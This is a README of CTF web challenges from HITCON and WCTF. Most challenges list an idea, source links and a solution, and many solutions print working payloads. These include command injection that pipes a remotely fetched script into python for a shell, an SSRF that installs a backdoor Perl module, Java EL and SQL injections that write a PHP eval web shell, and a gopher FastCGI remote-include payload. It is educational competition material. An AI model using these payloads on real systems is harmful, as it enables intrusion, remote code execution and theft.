#### The Challenges is COPY from https://github.com/orangetw/
Finished Dockerfile:

* [/hitcon-ctf-2017/babyfirst-revenge](https://github.com/Pr0phet/hitcon2017Dockerfile/tree/master/hitcon-ctf-2017/babyfirst-revenge)
* [/hitcon-ctf-2017/babyfirst-revenge-v2](https://github.com/Pr0phet/hitcon2017Dockerfile/tree/master/hitcon-ctf-2017/babyfirst-revenge-v2)
* [/hitcon-ctf-2017/sql-so-hard](https://github.com/Pr0phet/hitcon2017Dockerfile/tree/master/hitcon-ctf-2017/sql-so-hard)
* [/hitcon-ctf-2017/ssrfme](https://github.com/Pr0phet/hitcon2017Dockerfile/tree/master/hitcon-ctf-2017/ssrfme)
* [/hitcon-ctf-2017/baby^h-master-php-2017](https://github.com/Pr0phet/hitconDockerfile/tree/master/hitcon-ctf-2017/baby%5Eh-master-php-2017)

--------

Finished Writeup:
(The README file in the folder)
* [/hitcon-ctf-2017/babyfirst-revenge](https://github.com/Pr0phet/hitcon2017Dockerfile/tree/master/hitcon-ctf-2017/babyfirst-revenge)
* [/hitcon-ctf-2017/babyfirst-revenge-v2](https://github.com/Pr0phet/hitcon2017Dockerfile/tree/master/hitcon-ctf-2017/babyfirst-revenge-v2)
* [/hitcon-ctf-2017/sql-so-hard](https://github.com/Pr0phet/hitcon2017Dockerfile/tree/master/hitcon-ctf-2017/sql-so-hard)
* [/hitcon-ctf-2017/ssrfme](https://github.com/Pr0phet/hitcon2017Dockerfile/tree/master/hitcon-ctf-2017/ssrfme)
* [/hitcon-ctf-2017/baby^h-master-php-2017](https://github.com/Pr0phet/hitconDockerfile/tree/master/hitcon-ctf-2017/baby%5Eh-master-php-2017)

--------

My-CTF-Web-Challenges
# My CTF Web Challenges


Hi, I am Orange. This is the repo of CTF challenges I made. It contains challenge's source code, writeup and some idea explanation.  


I am a CTFer and Bug Bounty Hunter, loving web hacking and penetration testing. So you will see these challs are all about web. If you have any question about these challs, you can find me in following ways  

* orange@chroot.org   
* [blog.orange.tw](http://blog.orange.tw/)   


<br>
Hope you like it :)  


**P.s.** BTW, the series of `Babyfirst` are my favorite in all of these challenges. There are open questions to all and there are lots of creative solutions. If you don't have time to see all, please look the them at least!

* [Babyfirst](#babyfirst)  
* [Babyfirst Revenge](#babyfirst-revenge)  
* [Babyfirst Revenge v2](#babyfirst-revenge-v2)  

<br>



## **Table of Content**

* [HITCON 2017 Quals](#babyfirst-revenge)
    * [BabyFirst Revenge](#babyfirst-revenge)
    * [BabyFirst Revenge v2](#babyfirst-revenge-v2)
    * [SSRFme?](#ssrfme)
    * [SQL so Hard](#sql-so-hard)
    * [Baby^H Master PHP 2017](#babyh-master-php-2017)  

* [HITCON 2016 Quals](#papapa)
    * [%%%](#papapa)
    * [Leaking](#leaking)
    * [BabyTrick](#babytrick)
    * [Angry Boy](#angry-boy)
    * [Angry Seam](#angry-seam)  
    
* [HITCON 2015 Quals](#babyfirst)  
    * [Babyfirst](#babyfirst)
    * [nanana](#nanana)
    * [Giraffe's Coffee](#giraffes-coffee)
    * [lalala](#lalala)
    * [Use-After-FLEE](#use-after-flee)
    
* [HITCON 2014 Quals](#pushincat)
    * [PUSHIN CAT](#pushincat)
    * [PY4H4SHER](#py4h4sher)
    * [LEENODE](#leenode)
    
* [WCTF 2016](#blackbox)  
    * [BlackBox](#blackbox)

* [AIS3 Final 2015 Final](#sqlpwn)
    * [SQLPWN](#sqlpwn)
    
<br>

## **BabyFirst Revenge**
  
Difficulty: **★☆**  
Sovled: **95 / 1541**  
Tag:  **WhiteBox**, **PHP**, **Command Injection**  

#### Idea

* Command Injection, but only in **5** bytes  

#### Source Code

* [index.php](hitcon-ctf-2017/babyfirst-revenge/index.php)  

#### Solution

```bash
# generate `ls -t>g` to file "_"
http://host/?cmd=>ls\
http://host/?cmd=ls>_
http://host/?cmd=>\ \
http://host/?cmd=>-t\
http://host/?cmd=>\>g
http://host/?cmd=ls>>_

# generate `curl orange.tw|python` to file "g"
http://host/?cmd=>on
http://host/?cmd=>th\
http://host/?cmd=>py\
http://host/?cmd=>\|\
http://host/?cmd=>tw\
http://host/?cmd=>e.\
http://host/?cmd=>ng\
http://host/?cmd=>ra\
http://host/?cmd=>o\
http://host/?cmd=>\ \
http://host/?cmd=>rl\
http://host/?cmd=>cu\
http://host/?cmd=sh _

# got shell
http://host/?cmd=sh g
```

You can check the [exploit.py](hitcon-ctf-2017/babyfirst-revenge/exploit.py) for the detail! And there are also lots of creative solutions, you can check the write ups below.


#### Write Ups

* [HITCON CTF 2017-BabyFirst Revenge-writeup](https://chybeta.github.io/2017/11/04/HITCON-CTF-2017-BabyFirst-Revenge-writeup/)  
* [HITCON CTF 2017-BabyFirst Revenge-writeup (Via curl)](http://www.jianshu.com/p/82788b6949c7)  
* [HITCON 2017 CTF BabyFirst Revenge](https://infosec.rm-it.de/2017/11/06/hitcon-2017-ctf-babyfirst-revenge/)  
* [HITCON CTF 2017 - BabyFirst Revenge (172 pts.)](https://kimtruth.github.io/2017/11/06/HITCON-CTF-2017-BabyFirst-Revenge-172-pts/)  
* [Hitcon CTF 2017 - Baby Revenge](https://theromanxpl0it.github.io/ctf_hitcon2017/babyrevenge/)  
* [Hitcon CTF 2017 Quals: Baby First Revenge (web 172) (Via xxd)](https://losfuzzys.github.io/writeup/2017/11/06/hitconctf-babyfirstrevenge/)  
* [HITCON CTF 2017 BabyFirst Revenge & v2 writeup](https://findneo.github.io/2017/11/HITCON-CTF-2017-Babyfirst-Revenge-series-writeup/)  
* [BabyFirst-Revenge-HITCOIN-2017-QUALS by @n4p5ter](https://github.com/n4p5ter/BabyFirst-Revenge-HITCOIN-2017-QUALS)  



## **BabyFirst Revenge v2**
  
Difficulty: **★★★★**  
Sovled: **8 / 1541**  
Tag:  **WhiteBox**, **PHP**, **Command Injection**  

#### Idea

* Command Injection, but only in **4** bytes  

#### Source Code

* [index.php](hitcon-ctf-2017/babyfirst-revenge-v2/index.php)  

#### Solution

1. generate `g> ht- sl` to file `v`
2. reverse file `v` to file `x`
4. generate `curl orange.tw|python;`
6. execute `x`, `ls -th >g`
7. execute `g`

You can check [exploit.py](hitcon-ctf-2017/babyfirst-revenge-v2/exploit.py) for the detail!


#### Write Ups

* [Baby First Revenge v2 (Via vim) by @bennofs](https://github.com/bennofs/docs/blob/master/hitcon-2017/baby-first-revenge2.md)  
* [\[python\] baby-exp.py](https://codegists.com/snippet/python/baby-exppy_beched_python)  
* [How to solve a CTF challenge for $20 - HITCON 2017 BabyFirst Revenge v2](https://www.eugenekolo.com/blog/hitcon-babyfirst-revenge-v2/)  
* [HITCON CTF 2017 BabyFirst Revenge & v2 writeup](https://findneo.github.io/2017/11/HITCON-CTF-2017-Babyfirst-Revenge-series-writeup/)  



## **SSRFme?**
  
Difficulty: **★★☆**  
Sovled: **20 / 1541**  
Tag:  **WhiteBox**, **Perl**, **PATH Pollution**  

#### Idea

* [CVE-2016-1238](https://perl5.git.perl.org/perl.git/commit/cee96d52c39b1e7b36e1c62d38bcd8d86e9a41ab) (But the latest version of Ubuntu 17.04 in AWS is still vulnerable)  
* Perl lookup current directory in module importing  
* Perl module [URI/lib/URI.pm#L136](https://github.com/libwww-perl/URI/blob/b7680860f323a0cf3ffe5f6bdb684646e1ecac33/lib/URI.pm#L136) will `eval` if there is a  unknown scheme

#### Source Code

* [index.php](hitcon-ctf-2017/ssrfme/index.php)  

```bash
$ sudo apt install libwww-perl
```

#### Solution

```bash
# write evil URI module to current directory
$ curl http://host/?filename=URI/orange.pm&url=http://orange.tw/w/backdoor.pl

# eval evil module `orange`
$ curl http://host/?filename=xxx&url=orange://orange.tw
```

#### Write Ups

* [Another Solution by @Paul_Axe](https://twitter.com/Paul_Axe/status/927669724439293953)  
* [HITCON 2017 SSRFme](https://ricterz.me/posts/HITCON%202017%20SSRFme)  
* [SSRFme by @sorgloomer](https://github.com/sorgloomer/writeups/blob/master/writeups/2017-hitcon-quals/ssrfme.md)  



## **SQL so Hard**
  
Difficulty: **★★★**  
Sovled: **10 / 1541**  
Tag:  **WhiteBox**, **MySQL**, **PostgreSQL**, **SQL Injection**, **Code Injection**  

#### Idea

* MySQL `max_allowed_packet` dropped large size SQL sentence  
* [Node-Postgres - code execution vulnerability](https://node-postgres.com/announcements#2017-08-12-code-execution-vulnerability)  
* Exploit the RCE in SQL `UPDATE` syntax

#### Source Code

* [app.js](hitcon-ctf-2017/sql-so-hard/app.js)  

#### Solution

* [exploit.py](hitcon-ctf-2017/sql-so-hard/exploit.py)  

#### Write Ups

* [SQL so Hard by @sorgloomer](https://github.com/sorgloomer/writeups/blob/master/writeups/2017-hitcon-quals/sql-so-hard.md)  


## **Baby^H Master PHP 2017**
  
Difficulty: **★★★★☆**  
Sovled: **0 / 1541**  
Tag:  **WhiteBox**, **PHP**, **Serialization**, **Apache Prefock**  

#### Idea

* PHP do the de-serialization on `PHAR` parsing
* PHP assigned a predictable function name `\x00lambda_%d` to an anonymous function  
* Break shared VARIABLE state in Apache Pre-fork mode

#### Source Code

* [index.php](hitcon-ctf-2017/baby^h-master-php-2017/index.php)  

#### Solution

```bash
# get a cookie
$ curl http://host/ --cookie-jar cookie

# download .phar file from http://orange.tw/avatar.gif
$ curl -b cookie 'http://host/?m=upload&url=http://orange.tw/'

# force apache to fork new process
$ python fork.py &

# get flag
$ curl -b cookie "http://host/?m=upload&url=phar:///var/www/data/$MD5_IP/&lucky=%00lambda_1"
```

* [avatar.gif](hitcon-ctf-2017/baby^h-master-php-2017/avatar.gif)  
* [fork.py](hitcon-ctf-2017/baby^h-master-php-2017/fork.py)

#### Write Ups

* [По умолчанию Чтение файлов => unserialize !](https://rdot.org/forum/showthread.php?t=4379)  



## **papapa**
  
Difficulty: **★**  
Sovled: **71 / 1024**  
Tag:  **BlackBox**, **SSL**, **Pentesting**  

#### Idea

* Leak the internal hostname from SSL certificate  

#### Source Code

* [here](hitcon-ctf-2016/papapa)  

#### Solution

```bash
$ openssl s_client -showcerts -connect 1.2.3.4:443 < /dev/null | openssl x509 -text | grep -A 1 "Subject Alternativer Name"
...
depth=0 C = TW, ST = Some-State, O = Internet Widgits Pty Ltd, CN = very-secret-area-for-ctf.orange.tw, emailAddress = orange@chroot.org
...
# get flag
$ curl -k  -H "host: very-secret-area-for-ctf.orange.tw" https://1.2.3.4/
```

#### Write Ups

* [HITCON 2016](https://dinhbaoluciusteam.wordpress.com/2016/10/10/hitcon-2016/)  
* [HITCON CTF 2016: %%% (Web) Write-up](http://icheernoom.blogspot.tw/2016/10/hitcon-ctf-2016-web-write-up.html)  
* [\[HITCON 2016\] \[WEB 100 - %%%\] WRITE UP](https://0x90r00t.com/2016/10/10/hitcon-2016-web-100-write-up/)  
* [hitcon2016 web writeup](http://lorexxar.cn/2016/10/10/hitcon2016/)  



## **Leaking**

Difficulty: **★★**  
Sovled: **43 / 1024**  
Tag: **WhiteBox**, **JavaScript**, **NodeJS**  

#### Idea

* Break JavaScript Sandbox
* Use NodeJS `Buffer(int)` to steal uninitialized memory  
* [Node.js Buffer knows everything](https://github.com/ChALkeR/notes/blob/master/Buffer-knows-everything.md)

#### Source Code

* [here](hitcon-ctf-2016/leaking)

#### Solution

```bash
$ while true; do curl 'http://1.2.3.4/?data=Buffer(1e4)' | grep -a hitcon; done;

```

#### Write Ups

* [Hello HitCon 2016 CTF](https://ctfs.ghost.io/hello-hitcon-2016-ctf/#leaking)  
* [HITCON 2016 web 总结](http://0x48.pw/2016/10/14/0x24/)  
* [hitcon2016 web writeup](http://lorexxar.cn/2016/10/10/hitcon2016/)



## **BabyTrick**

Difficulty: **★★★**  
Sovled: **24 / 1024**  
Tag: **WhiteBox**, **PHP**, **MySQL**, **SQL Injection**, **Unserialize**

#### Idea

* [Create an Unexpected Object and Don't Invoke \_\_wakeup() in Deserialization](https://bugs.php.net/bug.php?id=72663)
* [SugarCRM v6.5.23 PHP反序列化對象注入漏洞](http://blog.knownsec.com/2016/09/sugarcrm-v6-5-23-php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AF%B9%E8%B1%A1%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/)
* MySQL UTF-8 collation - `SELECT 'Ä'='a'` is True

#### Source Code

* [here](hitcon-ctf-2016/babytrick)

#### Solution

```bash
# get password
curl http://1.2.3.4/
?data=O:6:"HITCON":3:{s:14:"%00HITCON%00method";s:4:"show";s:12:"%00HITCON%00args";a:1:{i:0;s:39:"'union%20select%201,2,password%20from%20users%23";}}

# get flag
curl http://1.2.3.4/
?data=O:6:"HITCON":2:{s:14:"%00HITCON%00method";s:5:"login";s:12:"%00HITCON%00args";a:2:{i:0;s:7:"orÄnge";i:1;s:13:"babytrick1234";}}
```

#### Write Ups

* [Hitcon 2016 – Baby Trick](http://0xecute.com/index.php/2016/10/10/baby-trick/)
* [Hello HitCon 2016 CTF](https://ctfs.ghost.io/hello-hitcon-2016-ctf/#babytrick)  
* [hitcon2016 web writeup](http://lorexxar.cn/2016/10/10/hitcon2016/)




## **Angry Boy**

Difficulty: **★★☆**  
Sovled: **43 / 1024**  
Tag: **GrayBox**, **Java**

#### Idea

* `new String(new byte[] {1, -1, 1, -1})` will output `01EFBFBD01EFBFBD`, not `01FF01FF`
* [When ‘EFBFBD’ And Friends Come Knocking: Observations Of Byte Array To String Conversions](https://blog.gdssecurity.com/labs/2015/2/18/when-efbfbd-and-friends-come-knocking-observations-of-byte-a.html)

#### Source Code

* [here](hitcon-ctf-2016/angry%20boy)

#### Solution

* [exploit.py](hitcon-ctf-2016/angry%20boy/exploit.py)
* [decrpt.py](hitcon-ctf-2016/angry%20boy/decrypt.py)

#### Write Ups

* [Angry Boy - Web 300 Problem](https://github.com/pwning/public-writeup/tree/master/hitcon2016/web300-angryboy)


## **Angry Seam**

Difficulty: **★★★★**  
Sovled: **4 / 1024**  
Tag: **GrayBox**, **Java**, **Seam Framework**, **CSS RPO**, **EL Injection**, **Java Deserialization**  

#### Idea

* CSS Relative Path Overwrite  
* Built-in redirection parameter `actionOutcome`  
* [RPO Gadgets](http://blog.innerht.ml/rpo-gadgets/)  
* [CVE-2010-1871: JBoss Seam Framework remote code execution](http://blog.o0o.nu/2010/07/cve-2010-1871-jboss-seam-framework.html)  


#### Source Code

* [here](hitcon-ctf-2016/angry%20seam)

#### Solution

<br>

**P.s.** I made this challenge because once when I try to review the code of Seam Framework, I found some 0-days and I think it must have more. So I throw out the brick to attract a jade. And the result is more than I expected :P  

<br>

**Intended solution**  

* Register an account  
   ```
   username: `AAAAAA`    
   password: `AAAAAA`  
   realname: `{/*';*/}%0a@import'http://orange.tw/?`  
   ```

* Report URL  
    ```
    http://1.2.3.4:8080/angryseam/profile.seam?actionOutcom>e=/profile.seam?username%3dAAAAAA
    ```

<br>

**Unintended solution**  

* Register an account  
* Update description to  
* Login and access   

```
/?x=#{expressions.instance().createValueExpression(request.getHeader('cmd')).getValue()}
```

```
GET /angryseam/template.seam?actionMethod=template.xhtml:util.escape(sessionScope['user'].getDescription()) HTTP/1.1
host: 1.2.3.4
cmd: #{expressions.getClass().forName('java.lang.Runtime').getDeclaredMethods()[15].invoke(expressions.getClass().forName('java.lang.Runtime').getDeclaredMethods()[7].invoke(null),request.getHeader('ccc'))}
ccc: ls -alh
...
```


**Unintended solution**  

* CVE-2013-2165 Java deserialization vulnerability

<br>

**Unintended solution**  

* SESSION manipulation... seam SUCKS  

#### Write Ups

* [Web500 Hitconctf 2016 and exploit CVE-2013-2165](http://vnprogramming.com/index.php/2016/10/10/web500-hitconctf-2016-and-exploit-cve-2013-2165/)
* [Angry Seam (500 pts)](https://github.com/Blaklis/write-ups/tree/master/hitcon)

## **Babyfirst**

Sovled: **33 / 969**  
Difficulty: **★★**  
Tag: **WhiteBox**, **PHP**, **Command Injection**  

#### Idea

* Use `NewLine` to bypass regular expression check  
* Command injection only with alphanumeric characters  

#### Source Code

* [here](hitcon-ctf-2015/babyfirst)  

```php
<?php
    highlight_file(__FILE__);

    $dir = 'sandbox/' . $_SERVER['REMOTE_ADDR'];
    if ( !file_exists($dir) )
        mkdir($dir);
    chdir($dir);

    $args = $_GET['args'];
    for ( $i=0; $i<count($args); $i++ ){
        if ( !preg_match('/^\w+$/', $args[$i]) )
            exit();
    }

    exec("/bin/orange " . implode(" ", $args));
?>
```


#### Solution

```text
http://localhost/
?args[0]=x%0a
&args[1]=mkdir
&args[2]=orange%0a
&args[3]=cd
&args[4]=orange%0a
&args[5]=wget
&args[6]=846465263%0a

http://localhost/
?args[0]=x%0a
&args[1]=tar
&args[2]=cvf
&args[3]=aa
&args[4]=orange%0a
&args[5]=php
&args[6]=aa
```

And there are also lots of creative solutions, you can check the write ups below.  


#### Write Ups

* [babyfirst (web 100)](https://github.com/pwning/public-writeup/blob/master/hitcon2015/web100-babyfirst/writeup.md)  
* [HITCON CTF 2015 Web 100 Web 300 Writeup](http://5alt.me/posts/2015/10/HITCON%20CTF%202015%20Web%20100%20Web%20300%20Writeup.html)  
* [HITCON 2015 Quals: Babyexploit](https://kt.pe/blog/2015/10/hitcon-2015-quals-babyexploit/)  
* [Babyfirst (web, 100p, ?? solves)](https://github.com/p4-team/ctf/tree/master/2015-10-18-hitcon/web_100_babyfirst#eng-version)  



## **nanana**

Difficulty: **★★★**  
Sovled: **18 / 969**  
Tag: **GrayBox**, **C**, **PWN**  

#### Idea
* Pwn without library  
* Format String without output  
* Bypass Stack Guard by using overflow `ARGV[1]`  

#### Source Code

* [here](hitcon-ctf-2015/nanana/)  

#### Solution  

* [exploit.py](hitcon-ctf-2015/nanana/exploit.py)  

#### Write Ups

* [nanana (pwn, web 200)](https://github.com/pwning/public-writeup/blob/master/hitcon2015/web200-nanana/writeup.md)  
* [HITCON 2015 Quals: Nanana](https://kt.pe/blog/2015/10/hitcon-2015-quals-nanana/)  
* [Pwning (sometimes) with style - Dragons’ notes on CTFs](http://j00ru.vexillium.org/blog/24_03_15/dragons_ctf.pdf)  


## **Giraffe's Coffee**

Difficulty: **★★★☆**  
Sovled: **16 / 969**  
Tag:  **WhiteBox**, **PHP**  

#### Idea
* Break PHP PRNG  
* Break shared PRNG STATE in Apache Prefork mode  

#### Source Code

* [here](hitcon-ctf-2015/giraffe's-coffee)  

#### Solution  

    TBD

#### Write Ups

* [HITCON CTF 2015 Web 100 Web 300 Writeup](http://5alt.me/posts/2015/10/HITCON%20CTF%202015%20Web%20100%20Web%20300%20Writeup.html)
* [Giraffe's Coffee - Web 300 Problem - Writeup by Robert Xiao (@nneonneo)](https://github.com/pwning/public-writeup/blob/master/hitcon2015/web300-giraffes-coffee/readme.md)
* [HITCON 2015 WEB 300](https://docs.google.com/document/d/1NlCF4jykgwuUMkr0I8HjbLRUKNAGf6jzRiI2D9TyumA/edit)


## **lalala**

Difficulty: **★★★☆**  
Sovled: **2 / 969**  
Tag: **BlackBox**, **PHP**, **SSRF**  

#### Idea

* Bypass SSRF restrictiton with 302 redirect  
* Exploit FASTCGI protocol by using GOPHER  

#### Source Code  

* [here](hitcon-ctf-2015/lalala)  

#### Solution    

```php
<?php
header( "Location: gopher://127.0.0.1:9000/x%01%01Zh%00%08%00%00%00%01%00%00%00%00%00%00%01%04Zh%00%86%00%00%0E%03REQUEST_METHODGET%0F%0ASCRIPT_FILENAME/www/a.php%0F%16PHP_ADMIN_VALUEallow_url_include%20%3D%20On%09%26PHP_VALUEauto_prepend_file%20%3D%20http%3A//orange.tw/x%01%04Zh%00%00%00%00%01%05Zh%00%00%00%00" );
```

#### Write Ups  

* [HITCON CTF 2015 Web 100 Web 300 Writeup](http://5alt.me/posts/2015/10/HITCON%20CTF%202015%20Web%20100%20Web%20300%20Writeup.html)  
* [Hitcon 2015 lalala web400 task](https://docs.google.com/document/d/1eALKwCyogM5Mw_D4qWe48X-PAGZw_2vT82aP0EPIr-8/mobilebasic?pli=1)  


## **Use-After-FLEE**  

Solved: **1 / 969**  
Difficulty: **★★★★☆**  
Tag: **WhiteBox**, **PHP**, **UAF**, **PWN**  

#### Idea

* Bypass open_basedir  
* Bypass disable_functions  
* PHP use-after-free exploit writing  
* Bypass full protection (DEP / ASLR / PIE / FULL RELRO)  
* [Yet Another Use After Free Vulnerability in unserialize() with SplDoublyLinkedList](https://github.com/80vul/phpcodz/blob/master/research/pch-034.md)  

#### Source Code  

* [here](hitcon-ctf-2015/use-after-flee)  

#### Solution    

    TBD

#### Write Ups

* [Use-After-FLEE (pwn, web 500)](https://github.com/pwning/public-writeup/blob/master/hitcon2015/web500-use-after-flee/writeup.md)


## **PUSHIN CAT**

Solved: **8 / 1020**  
Difficulty: **★★**  
Platform:  **BlackBox**, **PHP**, **H2**, **SQL Injection**  

#### Idea  

* SQL Injection on H2 Database  
* Execute Code by using H2 SQL Injection  

#### Source Code

* [here](hitcon-ctf-2014/pushincat)    

#### Solution  

    TBD

#### Write Ups

* [HITCON CTF 2014: PUSHIN CAT](https://github.com/ctfs/write-ups-2014/tree/master/hitcon-ctf-2014/pushin-cat)
* [HITCON CTF 2014 - PUSHIN CAT (H2 DB Insert SQL Injection)](https://www.youtube.com/watch?v=KNs5ZZo31P8)
* [HITCON CTF 2014](http://mage-ctf-writeup.blogspot.tw/2014/08/hitcon-ctf-2014.html)


## **PY4H4SHER**

Solved: **30 / 1020**  
Difficulty: **★★☆**  
Tag: **WhiteBox**, **Python**, **Collision**, **HPP**  

#### Idea

* Python CGI HTTP Pollution  
* MySQL old_password hash collisions  
* [PBKDF2+HMAC hash collisions explained](https://mathiasbynens.be/notes/pbkdf2-hmac)  

#### Source Code  

* [here](hitcon-ctf-2014/py4h4sher)  

#### Solution    

    TBD  

#### Write Ups  

* [HITCON CTF 2014: PY4H4SHER](https://github.com/ctfs/write-ups-2014/tree/master/hitcon-ctf-2014/py4h4sher)  
* [HITCON CTF 2014: PY4H4SHER WRITEUP](http://blog.st3phn.com/2014/08/hitcon-ctf-2014-py4h4sher-writeup.html)  
* [py4h4sher_solution.py](http://pastebin.com/DCbJ0qzi)  
* [HITCON CTF 2014](http://mage-ctf-writeup.blogspot.tw/2014/08/hitcon-ctf-2014.html)  


## **LEENODE**  

Solved: **2 / 1020**  
Difficulty: **★★★**  
Tag: **BlackBox**, **ColdFusion**, **Apache**  

#### Idea  

* Multilayered architecture vulnerability  
* Double Encoding  

#### Source Code  

* [here](hitcon-ctf-2014/leenode)  

#### Solution  

```bash
# get password
$ curl http://1.2.3.4/admin%252f%252ehtpasswd%2500.cfm

# get flag
$ curl http://1.2.3.4/admin/thefl4g.txt 

```

#### Write Ups  

* [HITCON CTF 2014: LEENODE](https://github.com/ctfs/write-ups-2014/tree/master/hitcon-ctf-2014/leenode)  
* [(web) LEENODE [250]](http://cdepillabout.github.io/ctf/2014/hitcon/leenode/writeup.html)  
* [CTF/Writeup/HITCON2014/LEENODE](https://wiki.mma.club.uec.ac.jp/CTF/Writeup/HITCON2014/LEENODE)  


## **BlackBox**

Solved: **0 / 12**  
Difficulty: **★★★★**  
Tag: **GrayBox**, **PHP**, **JAVA**, **mod_jk**, **H2**, **SQL Injection**, **WAF**  

#### Idea  

* Multilayered architecture vulnerability  
* Default and up to date mod_jk leads to directory travesal  
* Bypass WAF by incorrect usage of BASE64 and URLENCODE  
* SQL Injection on H2 Database  
* Execute Code by using H2 SQL Injection  

#### Source Code  

* [here](wctf-2016/BlackBox)  

#### Solution  

* Get source code  
   ```text
   http://1.2.3.4/login/..;/
   ```

* Review code and find a way to bypass WAF  
   ```bash
   $ curl "http://1.2.3.4/news/?id=1~~~~' and 1=2 union select null,null,version(),null--"
   $ curl "http://1.2.3.4/news/?id=1~~~~' and 1=2 union select null,null,file_read('/etc/apache2/sites-enabled/000-default.conf'),null--"
   ```  

* Write shell  
    ```bash
    $ curl "http://1.2.3.4/news/?id=1~~~~' and 1=2 union select null,null,file_write('3c3f706870206576616c28245f504f53545b6363635d293b3f3e', '/www/write_shell_here_=P/.a.php'),null--"
    $ curl "http://1.2.3.4/write_shell_here_=P/.a.php" -d 'phpinfo();'
    ```

#### Write Ups  

    TBD



## **SQLPWN**  

Solved: **0 / ??**  
Difficulty: **★★★**  
Tag: **WhiteBox**, **PHP**, **SQL Injection**, **LFI**, **Race Condition**  

#### Idea  

* One-byte off SQL Injection  
* Race Condition  
* Local file inclusion with PHP session  

#### Source Code  

* [here](ais3-final-2015/sqlpwn)  

#### Solution  

* Run [exploit.py](ais3-final-2015/sqlpwn/exploit.py) to win race condition

* Login and SQL Injection

   ```bash
   $ curl http://1.2.3.4/sqlpwn.php -d 'title=xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx\&note=, concat(0x3a3a3a3a3a3a,(select pass from users where name=0x6f72616e6765)))#'
   ```

* Local file inclusion with session
   ```bash
   $ curl http://1.2.3.4/sqlpwn.php?mode=admin&boom=../../../../../../var/lib/php5/sess_243220
   ```  

#### Write Ups  

* [AIS3 Final CTF Web Writeup (Race Condition & one-byte off SQL Injection)](http://blog.orange.tw/2015/09/ais3-final-ctf-web-writeup-race.html)  
* [AIS3 CTF Final Web1 & Web2](https://docs.google.com/document/d/1n-8LHsxJ6o1-Pr1ISKYyopcfLoUIQcF5CcZGl7KLbPY/edit)  



